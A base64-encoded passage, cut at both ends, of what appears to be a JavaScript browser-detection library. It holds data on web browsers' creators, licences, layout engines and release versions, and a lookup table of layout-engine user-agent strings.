cclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjIuOC45cmVsLjFcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiOCBKdWx5IDIwMThcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJtc2llXCI6IFwibXNpZVwiLFxyXG4gICAgICAgICAgICBcIk1pZG9yaVwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJNaWRvcmkgQnJvd3NlclwiLFxyXG4gICAgICAgICAgICAgICAgXCJ0eXBlXCI6IFwiV2ViIEJyb3dzZXJcIixcclxuICAgICAgICAgICAgICAgIFwidWlcIjogXCJHcmFwaGljYWxNb2RlXCIsXHJcbiAgICAgICAgICAgICAgICBcImNyZWF0b3JcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQ2hyaXN0aWFuIER5d2FuLCBldCBhbC5cIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvYXN0aWFuLm9yZ1xcL2VuXFwvbWlkb3JpLWJyb3dzZXJcXC9cIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImNvc3RcIjogXCJGcmVlXCIsXHJcbiAgICAgICAgICAgICAgICBcInN0YXR1c1wiOiBcIkFjdGl2ZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJsaWNlbmNlXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkxHUExcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9HTlVfTGVzc2VyX0dlbmVyYWxfUHVibGljX0xpY2Vuc2VcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxheW91dFwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJXZWJLaXRcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9XZWJLaXRcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxhdGVzdC1yZWxlYXNlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIlN0YWJsZSByZWxlYXNlXCI6IFtdLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiUHJldmlldyByZWxlYXNlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiOS4wXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIkp1bHkgMjksIDIwMTlcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJOZXRTdXJmXCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIk5ldFN1cmYgQnJvd3NlclwiLFxyXG4gICAgICAgICAgICAgICAgXCJ0eXBlXCI6IFwiV2ViIEJyb3dzZXJcIixcclxuICAgICAgICAgICAgICAgIFwidWlcIjogXCJHcmFwaGljYWxNb2RlXCIsXHJcbiAgICAgICAgICAgICAgICBcImNyZWF0b3JcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiVGhlIE5ldFN1cmYgRGV2ZWxvcGVyc1wiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwOlxcL1xcL3d3dy5uZXRzdXJmLWJyb3dzZXIub3JnXFwvXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJjb3N0XCI6IFwiRnJlZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJzdGF0dXNcIjogXCJBY3RpdmVcIixcclxuICAgICAgICAgICAgICAgIFwibGljZW5jZVwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJHUExcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9HTlVfR2VuZXJhbF9QdWJsaWNfTGljZW5zZVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF5b3V0XCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlF0IFdlYkVuZ2luZVwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL1F0X1dlYkVuZ2luZVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlF0V2ViS2l0XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvUXRXZWJLaXRcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxhdGVzdC1yZWxlYXNlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIlN0YWJsZSByZWxlYXNlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMy4xMFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCJNYXkgMjQsIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgXCJQcmV2aWV3IHJlbGVhc2VcIjogW11cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJPdHRlclwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJPdHRlciBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInR5cGVcIjogXCJXZWIgQnJvd3NlclwiLFxyXG4gICAgICAgICAgICAgICAgXCJ1aVwiOiBcIkdyYXBoaWNhbE1vZGVcIixcclxuICAgICAgICAgICAgICAgIFwiY3JlYXRvclwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJNaWNoYVxcdTAxNDIgRHV0a2lld2ljelwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9vdHRlci1icm93c2VyLm9yZ1xcL1wiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwiY29zdFwiOiBcIkZyZWVcIixcclxuICAgICAgICAgICAgICAgIFwic3RhdHVzXCI6IFwiQWN0aXZlXCIsXHJcbiAgICAgICAgICAgICAgICBcImxpY2VuY2VcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiR1BMdjNcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9HTlVfR2VuZXJhbF9QdWJsaWNfTGljZW5zZVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF5b3V0XCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlF0IFdlYkVuZ2luZVwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL1F0X1dlYkVuZ2luZVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlF0V2ViS2l0XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvUXRXZWJLaXRcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxhdGVzdC1yZWxlYXNlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIlN0YWJsZSByZWxlYXNlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMS4wLjAxXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIjEgSmFudWFyeSAyMDE5XCJcclxuICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgIFwiUHJldmlldyByZWxlYXNlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwid2Vla2x5MzMzXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIk1heSAxOCwgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIk1heHRob25cIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiTWF4dGhvbiBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInR5cGVcIjogXCJXZWIgQnJvd3NlclwiLFxyXG4gICAgICAgICAgICAgICAgXCJ1aVwiOiBcIkdyYXBoaWNhbE1vZGVcIixcclxuICAgICAgICAgICAgICAgIFwiY3JlYXRvclwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJNYXh0aG9uIEludGVybmF0aW9uYWwgTHRkXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvTWF4dGhvblwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwiY29zdFwiOiBcIlxcdEZyZWVcIixcclxuICAgICAgICAgICAgICAgIFwic3RhdHVzXCI6IFwiQWN0aXZlXCIsXHJcbiAgICAgICAgICAgICAgICBcImxpY2VuY2VcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiRnJlZXdhcmVcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9GcmVld2FyZVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF5b3V0XCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIldlYktpdFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL1dlYktpdFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlRyaWRlbnRcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9UcmlkZW50XyhsYXlvdXRfZW5naW5lKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF0ZXN0LXJlbGVhc2VcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwiV2luZG93c1wiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjUuMy44LjIwMDBcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiT2N0b2JlciAyNSwgMjAxOVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICBcIkFuZHJvaWRcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcInZlcnNpb25cIjogXCI1LjIuMy4zMjQxXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIkphbnVhcnkgMjUsIDIwMTlcIlxyXG4gICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgXCJtYWNPU1wiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjUuMS42MFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCJBdWd1c3QgMjcsIDIwMThcIlxyXG4gICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgXCJpT1NcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcInZlcnNpb25cIjogXCI1LjQuNVwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCJKdWx5IDIxLCAyMDIwXCJcclxuICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgIFwiV2luZG93cyBQaG9uZVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjIuMi4wXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIk1hcmNoIDMwLCAyMDE3XCJcclxuICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgIFwiTGludXhcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcInZlcnNpb25cIjogXCIxLjAuNS4zXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIlNlcHRlbWJlciA5LCAyMDE0XCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwic2FmYXJpXCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcInNhZmFyaSBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInR5cGVcIjogXCJXZWIgQnJvd3NlclwiLFxyXG4gICAgICAgICAgICAgICAgXCJ1aVwiOiBcIkdyYXBoaWNhbE1vZGVcIixcclxuICAgICAgICAgICAgICAgIFwiY3JlYXRvclwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJBcHBsZSBJbmMuXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvQXBwbGVfSW5jLlwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwiY29zdFwiOiBcIkluY2x1ZGVkIHdpdGggbWFjT1MgYW5kIGlPU1wiLFxyXG4gICAgICAgICAgICAgICAgXCJzdGF0dXNcIjogXCJBY3RpdmVcIixcclxuICAgICAgICAgICAgICAgIFwibGljZW5jZVwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJQcm9wcmlldGFyeSAoYnJvd3NlcilcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9Qcm9wcmlldGFyeV9zb2Z0d2FyZVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkxHUEwgKFdlYktpdCkgXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvR05VX0xlc3Nlcl9HZW5lcmFsX1B1YmxpY19MaWNlbnNlXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJsYXlvdXRcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiV2ViS2l0XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvV2ViS2l0XCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJsYXRlc3QtcmVsZWFzZVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJtYWNPU1wiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjE0LjBcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiU2VwdGVtYmVyIDE3LCAyMDIwXCJcclxuICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgIFwiaU9TXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMTQuMFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCJTZXB0ZW1iZXIgMTcsIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH07XHJcblxyXG4gICAgICAgIC8qV2ViIEJyb3dzZXIgTGF5b3V0IGVuZ2luZXMgTGlzdCovIC8qXHJcbiAgICAgICAgICAgICAqIExheW91dCBlbmdpbmVzXHJcbiAgICAgICAgICAgICAqXHJcbiAgICAgICAgICAgICAqIEdlY2tvIGlzIGRldmVsb3BlZCBieSB0aGUgTW96aWxsYSBGb3VuZGF0aW9uLlxyXG4gICAgICAgICAgICAgKiBHb2FubmEgaXMgYSBmb3JrIG9mIEdlY2tvIGRldmVsb3BlZCBieSBNb29uY2hpbGQgUHJvZHVjdGlvbnMuXHJcbiAgICAgICAgICAgICAqIEtIVE1MIGlzIGRldmVsb3BlZCBieSB0aGUgS0RFIHByb2plY3QuXHJcbiAgICAgICAgICAgICAqIFByZXN0byB3YXMgZGV2ZWxvcGVkIGJ5IE9wZXJhIFNvZnR3YXJlIGZvciB1c2UgaW4gT3BlcmEuIERldmVsb3BtZW50IHN0b3BwZWQgYXMgT3BlcmEgdHJhbnNpdGlvbmVkIHRvIEJsaW5rLlxyXG4gICAgICAgICAgICAgKiBUYXNtYW4gd2FzIGRldmVsb3BlZCBieSBNaWNyb3NvZnQgZm9yIHVzZSBpbiBJbnRlcm5ldCBFeHBsb3JlciA1IGZvciBNYWNpbnRvc2guXHJcbiAgICAgICAgICAgICAqIFRyaWRlbnQgaXMgZGV2ZWxvcGVkIGJ5IE1pY3Jvc29mdCBmb3IgdXNlIGluIHRoZSBXaW5kb3dzIHZlcnNpb25zIG9mIEludGVybmV0IEV4cGxvcmVyIDQgdG8gSW50ZXJuZXQgRXhwbG9yZXIgMTEuXHJcbiAgICAgICAgICAgICAqIEVkZ2VIVE1MIGlzIHRoZSBlbmdpbmUgZGV2ZWxvcGVkIGJ5IE1pY3Jvc29mdCBmb3IgRWRnZS4gSXQgaXMgYSBsYXJnZWx5IHJld3JpdHRlbiBmb3JrIG9mIFRyaWRlbnQgd2l0aCBhbGwgbGVnYWN5IGNvZGUgcmVtb3ZlZC5cclxuICAgICAgICAgICAgICogV2ViS2l0IGlzIGEgZm9yayBvZiBLSFRNTCBieSBBcHBsZSBJbmMuIHVzZWQgaW4gQXBwbGUgU2FmYXJpLCBhbmQgZm9ybWVybHkgaW4gQ2hyb21pdW0gYW5kIEdvb2dsZSBDaHJvbWUuXHJcbiAgICAgICAgICAgICAqIEJsaW5rIGlzIGEgMjAxMyBmb3JrIG9mIFdlYktpdCdzIFdlYkNvcmUgY29tcG9uZW50IGJ5IEdvb2dsZSB1c2VkIGluIENocm9taXVtLCBHb29nbGUgQ2hyb21lLCBNaWNyb3NvZnQgRWRnZSwgT3BlcmEsIGFuZCBWaXZhbGRpLlsxOV1cclxuICAgICAgICAgICAgICogU2Vydm8gaXMgYW4gZXhwZXJpbWVudGFsIHdlYiBicm93c2VyIGxheW91dCBlbmdpbmUgYmVpbmcgZGV2ZWxvcGVkIGNvb3BlcmF0aXZlbHkgYnkgTW96aWxsYSBhbmQgU2Ftc3VuZy4qL1xyXG4gICAgICAgIHRoaXMud2ViQnJvd3NlckxheW91dExpc3QgPSB7XHJcbiAgICAgICAgICAgIFwiRWRnZUhUTUxcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiRWRnZUhUTUxcIixcclxuICAgICAgICAgICAgICAgIFwiZGV2ZWxvcGVyXCI6IFwiTWljcm9zb2Z0XCIsXHJcbiAgICAgICAgICAgICAgICBcImNvbnRhaW5cIjogXCJFZGdcIixcclxuICAgICAgICAgICAgICAgIFwiY29udGFpbl9leGFtcGxlXCI6IFwiRWRnZVxcL3h5elwiXHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwiQmxpbmtcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQmxpbmtcIixcclxuICAgICAgICAgICAgICAgIFwiZGV2ZWxvcGVyXCI6IFwiR29vZ2xlXCIsXHJcbiAgICAgICAgICAgICAgICBcImNvbnRhaW5cIjogXCJDaHJvbWVcIixcclxuICAgICAgICAgICAgICAgIFwiY29udGFpbl9leGFtcGxlXCI6IFwiQ2hyb21lXFwveHl6XCJcclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJHZWNrb1wiOiB7XHJcbiAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJHZWNrb1wiLFxyXG4gICAgICAgICAgICAgICAgXCJkZXZlbG9wZXJcIjogXCJNb3ppbGxhIEZvdW5kYXRpb25cIixcclxuICAgICAgICAgICAgICAgIFwiY29udGFpblwiOiBcIkdlY2tvXCIsXHJcbiAgICAgICAgICAgICAgICBcImNvbnRhaW5fZXhhbXBsZVwiOiBcIkdlY2tvXFwveHl6XCJcclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJHb2FubmFcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiR29hbm5hXCIsXHJcbiAgICAgICAgICAgICAgICBcImRldmVsb3BlclwiOiBcIk1vb25jaGlsZCBQcm9kdWN0aW9uc1wiLFxyXG4gICAgICAgICAgICAgICAgXCJjb250YWluXCI6IFwiR29hbm5hXCIsXHJcbiAgICAgICAgICAgICAgICBcImNvbnRhaW5fZXhhbXBsZVwiOiBcIkdvYW5uYVxcL3h5elwiXHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwiS0hUTUxcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiS0hUTUxcIixcclxuICAgICAgICAgICAgICAgIFwiZGV2ZWxvcGVyXCI6IFwiS0RFIHByb2plY3RcIixcclxuICAgICAgICAgICAgICAgIFwiY29udGFpblwiOiBcIktIVE1MXCIsXHJcbiAgICAgICAgICAgICAgICBcImNvbnRhaW5fZXhhbXBsZVwiOiBcIktIVE1MXFwveHl6XCJcclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJQcmVzdG9cIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiUHJlc3RvXCIsXHJcbiAgICAgICAgICAgICAgICBcImRldmVsb3BlclwiOiBcIk9wZXJhIFNvZnR3YXJlXCIsXHJcbiAgICAgICAgICAgICAgICBcImNvbnRhaW5cIjogXCJPcGVyYVwiLFxyXG4gICAgICAgICAgICAgICAgXCJjb250YWluX2V4YW1wbGVcIjogXCJPcGVyYVxcL3h5elwiXHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwiVGFzbWFuXCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlRhc21hblwiLFxyXG4gICAgICAgICAgICAgICAgXCJkZXZlbG9wZXJcIjogXCJNaWNyb3NvZnRcIixcclxuICAgICAgICAgICAgICAgIFwiY29udGFpblwiOiBcIlRhc21hblwiLFxyXG4gICAgICAgICAgICAgICAgXCJjb250YWluX2V4YW1wbGVcIjogXCJUYXNtYW5cXC94eXpcIlxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIlRyaWRlbnRcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiVHJpZGVudFwiLFxyXG4gICAgICAgICAgICAgICAgXCJkZXZlbG9wZXJcIjogXCJNaWNyb3NvZnRcIixcclxuICAgICAgICAgICAgICAgIFwiY29udGFpblwiOiBcIlRyaWRlbnRcIixcclxuICAgICAgICAgICAgICAgIFwiY29udGFpbl9leGFtcGxlXCI6IFwiVHJpZGVudFxcL3h5elwiXHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwiV2ViS2l0XCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIldlYktpdFwiLFxyXG4gICAgICAgICAgICAgICAgXCJkZXZlbG9wZXJcIjogXCJBcHBsZSBJbmNcIixcclxuICAgICAgICAgICAgICAgIFwiY29udGFpblwiOiBcIkFwcGxlV2ViS2l0XCIsXHJcbiAgICAgICAgICAgICAgICBcImNvbnRhaW5fZXhhbXBsZVwiOiBcIkFwcGxlV2ViS2l0XFwveHl6XCJcclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJTZXJ2b1wiOiB7XHJcbiAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJTZXJ2b1wiLFxyXG4gICAgICAgICAgICAgICAgXCJkZXZlbG9wZXJcIjogXCJjb29wZXJhdGl2ZWx5IGJ5IE1vemlsbGEgYW5kIFNhbXN1bmdcIixcclxuICAgICAgICAgICAgICAgIFwiY29udGFpblwiOiBcIlNlcnZvXCIsXHJcbiAgICAgICAgICAgICAgICBcImNvbnRhaW5fZXhhbXBsZVwiOiBcIlNlcnZvXFwveHl6XCJcclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJsaWJ3d3ctRk1cIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwibGlid3d3LUZNXCIsXHJcbiAgICAgICAgICAgICAgICBcImRldmVsb3BlclwiOiBcIlRpbSBCZXJuZXJzLUxlZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJjb250YWluXCI6IFwibGlid3d3LUZNXCIsXHJcbiAgICAgICAgICAgICAgICBcImNvbnRhaW5fZXhhbXBsZVwiOiBcImxpYnd3dy1GTVxcL3h5elwiXHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9O1xyXG5cclxuICAgICAgICAvKlBhcmVudCBBcHAgb2YgQnJvd3NlciovXHJcbiAgICAgICAgdGhpcy53ZWJCcm93c2VyQXBwQ29kZU5hbWVMaXN0ID0gW3snbmFtZSc6ICdtb3ppbGxhJywgJ2NvZGUnOiAnTW96aWxsYSd9XTtcclxuXHJcblxyXG4gICAgICAgIC8qKiB1cGRhdGUgZGJcclxuICAgICAgICAgKlxyXG4gICAgICAgICAqIGNvbnN0IHNlbGYgP